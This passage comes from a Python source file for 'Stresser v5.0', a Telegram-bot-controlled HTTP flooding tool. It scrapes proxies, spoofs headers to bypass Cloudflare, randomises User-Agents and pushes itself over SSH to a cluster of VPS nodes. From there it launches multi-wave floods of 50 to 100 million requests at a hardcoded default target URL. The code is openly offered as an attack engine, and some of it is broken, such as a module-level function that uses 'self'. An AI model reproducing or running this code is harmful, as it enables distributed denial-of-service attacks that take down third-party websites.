                lines.append(f"❌ Error: {str(r)[:80]}")
        await self.send(chat_id, "\n".join(lines))

    async def _cmd_deploy(self, chat_id: int, args: List[str]) -> None:
        if not args:
            await self.send(chat_id,
                "Usage: /deploy <attack_args>\n"
                "Ex: /deploy https://target.com -d 60 -c 2000 --cf")
            return
        servers = self.vps.list()
        if not servers:
            await self.send(chat_id, "📭 No VPS.")
            return
        cmd = " ".join(args)
        await self.send(chat_id, f"🚀 Deploying to {len(servers)} VPS...\n<code>{cmd}</code>")
        async def deploy_one(srv):
            return srv['ip'], await self.vps.deploy_and_run(srv, cmd)
        results = await asyncio.gather(*[deploy_one(s) for s in servers], return_exceptions=True)
        lines = ["📡 Results"]
        for r in results:
            if isinstance(r, tuple):
                lines.append(f"<code>{r[0]}</code>: {str(r[1])[:200]}")
            elif isinstance(r, Exception):
                lines.append(f"Error: {str(r)[:80]}")
        await self.send(chat_id, "\n".join(lines))

    async def _cmd_scrape(self, chat_id: int, args: List[str]) -> None:
        await self.send(chat_id, "🔍 Scraping proxies from APIs...")
        count = await self.proxy_mgr.scrape()
        await self.send(chat_id, f"✅ Scraped {count} total proxies\n/checkproxy to validate.")

    async def _cmd_proxies(self, chat_id: int, args: List[str]) -> None:
        s = self.proxy_mgr.stats()
        await self.send(chat_id, f"📊 <b>Proxy Stats</b>\n{s}")

    async def _cmd_checkproxy(self, chat_id: int, args: List[str]) -> None:
        proxies = self.proxy_mgr.all_proxies
        if not proxies:
            await self.send(chat_id, "No proxies. /scrape first.")
            return
        await self.send(chat_id, f"🔍 Testing {len(proxies)} proxies (max 100 concurrent)...")
        working, failed, saved = await self.proxy_mgr.check_all()
        await self.send(chat_id,
            f"✅ <b>Proxy Check Complete</b>\n"
            f"Tested: {working+failed}\n"
            f"Working: {working}\n"
            f"Failed: {failed}\n"
            f"Saved: {saved}"
        )

    async def run(self):
        """Main bot polling loop."""
        print("[Bot] v5.0 started - Multi-target, VPS, CF Auto-Bypass v2, CAPTCHA Solve, Tools")
        await self.broadcast(
            "🤖━━━━━━━━━━━━━━━━━━\n"
            "🤖 <b>Stresser Bot v5.0</b>\n"
            "🤖━━━━━━━━━━━━━━━━━━\n"
            "🔥 Multi-target unlimited\n"
            "🛡️ CF Auto-Bypass v2 | Cookie Harvest\n"
            "🔑 CAPTCHA solver (capsolver)\n"
            "🌐 VPS cluster | SCP deploy\n"
            "📊 Tools: speedtest, scan, dns, geoip\n"
            "⚙️ /settings to configure\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "Type /start to see all commands"
        )
        while True:
            try:
                import aiohttp
                async with aiohttp.ClientSession() as session:
                    while True:
                        update = await self.get_updates(session)
                        if update:
                            await self.handle_command(update)
                        else:
                            await asyncio.sleep(1)
            except asyncio.CancelledError:
                break
            except Exception as e:
                print(f"[Bot] Poll: {e}")
                await asyncio.sleep(5)

# ===================================================================
# SECTION 5: MAIN ENTRY POINT
# ===================================================================

def main():
    p = argparse.ArgumentParser(
        description="Stresser v5.0 - Telegram-controlled HTTP stress-testing tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
  python3 stresser.py http://target.com -d 30 -c 2000
  python3 stresser.py https://target.com -d 60 -c 500 --cf-bypass
  python3 stresser.py --telegram
  python3 stresser.py http://target.com --proxy-list proxies.txt --rand-ua
        """,
    )
    p.add_argument("url", nargs="?", help="Target URL")
    p.add_argument("--mode", choices=["server", "client"], default="client")
    p.add_argument("--telegram", action="store_true", help="Start Telegram bot controller")
    p.add_argument("-d", "--duration", type=int, default=30, help="Test duration in seconds")
    p.add_argument("-c", "--connections", type=int, default=500,
                   help="Concurrent connections (default: 500)")
    p.add_argument("-t", "--timeout", type=float, default=10, help="I/O timeout in seconds")
    p.add_argument("--cf-bypass", action="store_true",
                   help="Enable Cloudflare bypass (browser headers + spoofing)")
    p.add_argument("--rand-ua", action="store_true", help="Randomize User-Agent per request")
    p.add_argument("--proxy-list", type=str, help="File with proxy list (ip:port per line)")
    p.add_argument("--http2", action="store_true", help="Use HTTP/2 via httpx")
    p.add_argument("-m", "--method", default="GET", help="HTTP method: GET, POST, HEAD, PUT")
    p.add_argument("--multi", type=int, default=1, help="Number of parallel processes")
    args = p.parse_args()

    if args.telegram:
        async def bot_main():
            bot = TelegramBot(BOT_TOKEN, ALLOWED_CHAT_IDS)
            await bot.run()

        try:
            asyncio.run(bot_main())
        except KeyboardInterrupt:
            print("\n[!] Bot stopped.")
            sys.exit(0)
        return

    if not args.url:
        p.print_help()
        return

    # CLI mode
    proxy_list = []
    if args.proxy_list:
        proxy_list = load_proxy_file(args.proxy_list)

    if args.multi > 1:
        num_processes = args.multi
        mp_ctx = mp.get_context('spawn')
        processes = []
        result_queue = mp_ctx.Queue()
        per_proc = max(1, args.connections // num_processes)
        print(f"  [{time.strftime('%H:%M:%S')}] Starting {num_processes} processes...")
        for i in range(num_processes):
            p_proc = mp_ctx.Process(
                target=_mp_worker,
                args=(i, args.url, args.duration, per_proc, args.timeout,
                      args.cf_bypass, args.rand_ua, proxy_list, result_queue, args.http2),
            )
            p_proc.start()
            processes.append(p_proc)
        total_ok = total_fail = total_recv = total_lat = 0
        lat_min = float('inf')
        lat_max = 0.0
        all_sc = {}
        all_errors = {}
        total = 0
        for _ in range(num_processes):
            r = result_queue.get()
            total_ok += r.get('ok', 0)
            total_fail += r.get('fail', 0)
            total_recv += r.get('bytes', 0)
            total_lat += r.get('lat_total', 0)
            if r.get('lat_min', float('inf')) < lat_min:
                lat_min = r['lat_min']
            if r.get('lat_max', 0) > lat_max:
                lat_max = r['lat_max']
            for code, cnt in r.get('sc', {}).items():
                all_sc[code] = all_sc.get(code, 0) + cnt
            for e, cnt in r.get('errors', {}).items():
                all_errors[e] = all_errors.get(e, 0) + cnt
            total += r.get('total', 0)
        for p in processes:
            p.join()
        elapsed = args.duration
        rps = total / elapsed if elapsed > 0 else 0
        print(f"\n  MULTI-PROCESS AGGREGATED RESULTS")
        print(f"  {'='*60}")
        print(f"  Duration:      {elapsed:.2f}s")
        print(f"  Processes:     {num_processes}")
        print(f"  Total:         {total:,}")
        print(f"  Completed:     {total_ok:,}")
        print(f"  Failed:        {total_fail:,}")
        print(f"  Requests/sec:  {rps:,.2f}")
        if total_recv:
            print(f"  Throughput:    {total_recv/1024/1024:.2f} MB/s")
        if total_ok > 0:
            avg_lat = total_lat / total_ok
            print(f"  Avg latency:   {avg_lat*1000:.2f}ms")
            print(f"  Min latency:   {lat_min*1000:.2f}ms")
            print(f"  Max latency:   {lat_max*1000:.2f}ms")
            print(f"  Status codes:  {dict(sorted(all_sc.items()))}")
        if all_errors:
            print(f"  Errors:        {dict(sorted(all_errors.items()))}")
        print(f"  {'='*60}\n")
        return

    # Single-process CLI
    async def main_async():
        result = await stress(args.url, args.duration, args.connections,
                              args.timeout, args.cf_bypass, args.rand_ua,
                              proxy_list, http2=args.http2, method=args.method)
        ok = result.get('ok', 0)
        fail = result.get('fail', 0)
        total = result.get('total', 0)
        rps = result.get('rps', 0)
        elapsed = result.get('elapsed', 0)
        sc = result.get('sc', {})
        errs = result.get('errors', {})
        bytes_recv = result.get('bytes', 0)
        print(f"\n  STRESS TEST COMPLETE")
        print(f"  {'='*60}")
        print(f"  URL:           {args.url}")
        print(f"  Duration:      {elapsed:.2f}s")
        print(f"  Connections:   {args.connections}")
        print(f"  Method:        {args.method}")
        print(f"  CF Bypass:     {'Yes' if args.cf_bypass else 'No'}")
        print(f"  Total:         {total:,}")
        print(f"  Completed:     {ok:,}")
        print(f"  Failed:        {fail:,}")
        print(f"  Requests/sec:  {rps:,.2f}")
        if ok:
            print(f"  Throughput:    {bytes_recv/1024/1024:.2f} MB/s")
        if sc:
            print(f"  Status codes:  {dict(sorted(sc.items()))}")
        if errs:
            print(f"  Errors:        {dict(sorted(errs.items()))}")
        print(f"  {'='*60}\n")
    asyncio.run(main_async())

def _mp_worker(pid: int, url: str, duration: int, connections: int,
               timeout: float, cf_bypass: bool, rand_ua: bool,
               proxy_list: List[str], result_queue: mp.Queue,
               http2: bool = False) -> None:
    import asyncio
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(
            stress(url, duration, connections, timeout,
                   cf_bypass, rand_ua, proxy_list, http2=http2)
        )
    except Exception as e:
        result = {'ok': 0, 'fail': 0, 'bytes': 0, 'lat_total': 0,
                  'lat_min': 0, 'lat_max': 0, 'sc': {}, 'errors': {str(e): 1},
                  'total': 0, 'rps': 0, 'elapsed': 0}
    finally:
        loop.close()
    result_queue.put(result)


# ===================================================================
# v5.2: 50M-100M High-Volume Attack Engine - Distributed across 3 VPS
# ===================================================================
HIGH_VOL_DEFAULT_TARGET = "https://captcha.dstatbot.win/I12A9dlp"
HIGH_VOL_WAVE_DURATION = 600
HIGH_VOL_TARGETS = [50000000, 100000000]  # 50M and 100M

async def cmd_high_volume(chat_id: int, args: List[str]) -> None:
    """Launch persistent 50M-100M attack across all VPS nodes."""
    target = args[0] if args else HIGH_VOL_DEFAULT_TARGET
    target_count = 50000000  # Default 50M
    if len(args) > 1 and args[1] == "100m":
        target_count = 100000000
    
    servers = self.vps.list()
    if not servers:
        await self.send(chat_id, "❌ No VPS nodes registered. Use /addvps first.")
        return
    
    await self.send(chat_id,
        f"🚀 <b>50M-100M Attack Engine</b>\n"
        f"Target: {target}\n"
        f"VPS Nodes: {len(servers)}\n"
        f"Target Req: {target_count:,}\n"
        f"Wave Duration: {HIGH_VOL_WAVE_DURATION}s\n"
        f"Launching all nodes..."
    )
    
    self.running_attack = True
    self.attack_start = time.time()
    
    async def run_high_volume():
        nonlocal target_count
        grand_total = 0
        wave = 0
        servers_list = self.vps.list()
        
        while grand_total < target_count and self.running_attack:
            wave += 1
            wave_start = time.time()
            
            await self.send(chat_id,
                f"🌊 <b>Wave {wave}</b>\n"
                f"Progress: {grand_total:,} / {target_count:,}\n"
                f"Remaining: {target_count - grand_total:,}")
            
            tasks = []
            for s in servers_list:
                task = asyncio.create_task(
                    deploy_and_run_wave(s, target, HIGH_VOL_WAVE_DURATION)
                )
                tasks.append(task)
            
            try:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                wave_reqs = sum([r for r in results if isinstance(r, (int, float))])
                grand_total += int(wave_reqs)
                
                elapsed = time.time() - self.attack_start
                rps = grand_total / elapsed if elapsed > 0 else 0
                
                await self.send(chat_id,
                    f"✅ <b>Wave {wave} Complete</b>\n"
                    f"This wave: {wave_reqs:,.0f} requests\n"
                    f"Total: {grand_total:,} / {target_count:,}\n"
                    f"RPS: {rps:,.1f}\n"
                    f"Elapsed: {elapsed:.0f}s")
                
            except asyncio.CancelledError:
                break
        
        self.running_attack = False
        if grand_total >= target_count:
            await self.send(chat_id,
                f"🎯 <b>Target Achieved!</b>\n"
                f"Total Requests: {grand_total:,}\n"
                f"Waves: {wave}\n"
                f"Target: {target}")
    
    self.attack_task = asyncio.create_task(run_high_volume())

async def deploy_and_run_wave(server: dict, target: str, duration: int) -> int:
    """Deploy and run one wave on a single VPS. Returns total requests."""
    import asyncssh
    import io
    total_req = 0
    try:
        async with asyncssh.connect(
            server['ip'], port=int(server.get('port', 22)),
            username=server['username'], password=server['password'],
            known_hosts=None, connect_timeout=15
        ) as ssh:
            # Deploy latest code
            local_path = '/root/kalipto-runtime/stresser.py'
            if os.path.exists(local_path):
                with open(local_path, 'rb') as f:
                    data = f.read()
                await ssh.run('cat > /opt/kalipto-runtime/stresser.py', stdin=io.BytesIO(data))
            
            # Launch 8 parallel instances
            cmds = []
            for i in range(8):
                method = "GET"
                http2 = ""
                conns = 2000
                if i == 0:
                    http2 = "--http2"
                    conns = 300
                elif i % 4 == 0:
                    method = "POST"
                cmds.append(
                    f"setsid python3 -u /opt/kalipto-runtime/stresser.py "
                    f"'{target}' -d {duration} -c {conns} {http2}"
                    f"--cf-bypass --rand-ua -m {method} "
                    f"> /tmp/wave_wave_{i}.log 2>&1 &"
                )
            await ssh.run(" && ".join(cmds))
            
            # Wait for completion
            await asyncio.sleep(duration + 10)
            
            # Count results
            result = await ssh.run(
                "grep -h 'Total:' /tmp/wave_*.log 2>/dev/null | "
                "awk -F: '{gsub(/[ ,]/, "", $NF); sum+=$NF} END {print sum}'"
            )
            if result.stdout:
                total_req = int(result.stdout.strip())
    except Exception:
        pass
    return total_req


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(0)
